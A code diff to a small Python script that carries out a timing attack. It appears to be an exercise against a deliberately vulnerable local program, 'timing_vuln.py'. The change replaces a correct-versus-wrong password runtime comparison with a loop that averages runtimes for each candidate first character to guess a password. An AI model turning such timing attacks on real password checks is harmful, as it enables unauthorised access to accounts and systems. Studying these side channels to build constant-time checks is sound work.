@@ -16,41 +16,25 @@ def time_for_password(password):
     return time.time() - start
 
 
+def avg_time_for_password(password, tries=30):
+    
+    # Get multiple runtimes
+    durations = [time_for_password(password) for n in range(tries)]
+    
+    # Calculate Average
+    return sum(durations)/len(durations)
 
-def timing_attack(command, tries=1000):
-    durations = []
-
-    for n in range(tries):
-        print("Executing", command, "for the", n, "-th time")
-
-        start = time.time()
-
-        p = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-
-        duration = time.time() - start
-        durations.append(duration)
-        
-    return durations
-
-def avg(l):
-    return sum(l)/len(l)
 
 def main():
 
-    tries = 200
+    guess = list("00000")
+    # Get timing for all chars
+    for c in ALPHABET:
+        guess[0] = c
+        print("Current Guess:", "".join(guess))
+        print("Avg. Run-Time:", avg_time_for_password("".join(guess)))
 
-    correct_password = "12345678"
-    wrong_password = "12045678"
-
-    correct_cmd = " ".join(["python3", "timing_vuln.py", correct_password])
-    wrong_cmd = " ".join(["python3", "timing_vuln.py", wrong_password])
-
-    correct_duration_avg = avg(timing_attack(correct_cmd, tries))
-    wrong_duration_avg = avg(timing_attack(wrong_cmd, tries))
-
-    print(correct_duration_avg)
-    print(wrong_duration_avg)
-
+    
 
 if __name__ == "__main__":
     main()
